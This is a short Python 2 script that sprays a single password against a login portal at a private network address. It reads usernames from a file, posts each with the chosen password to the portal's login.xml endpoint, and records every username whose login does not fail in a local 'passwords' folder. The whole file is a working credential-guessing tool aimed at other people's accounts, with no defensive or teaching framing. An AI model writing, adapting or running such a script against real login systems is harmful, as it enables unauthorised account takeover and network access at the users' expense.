#!/usr/bin/python
from urllib import urlencode
from urllib2 import urlopen
from sys import argv
import os
BASE_URL = "http://172.16.68.6:8090/login.xml"
def send_request(request_type, *arg):
    if(request_type == 'login'):
        params = urlencode(
            {'mode': 191, 'username': arg[0], 'password': arg[1]})
    response = urlopen(BASE_URL, params)
    return response.read()

if __name__ == "__main__":
    p = argv[1]
    print p
    if not os.path.exists("passwords"):
        os.makedirs("passwords")
    fo=open("passwords/"+p+".txt","w")
    with open('username.txt') as openfileobject:
        for line in openfileobject:
            line=line[:-1]
            data = send_request("login", line, p)
            if not "could not" in data:
                fo.write(line+ "\n")
                print line + " found for given password.."
    fo.close()
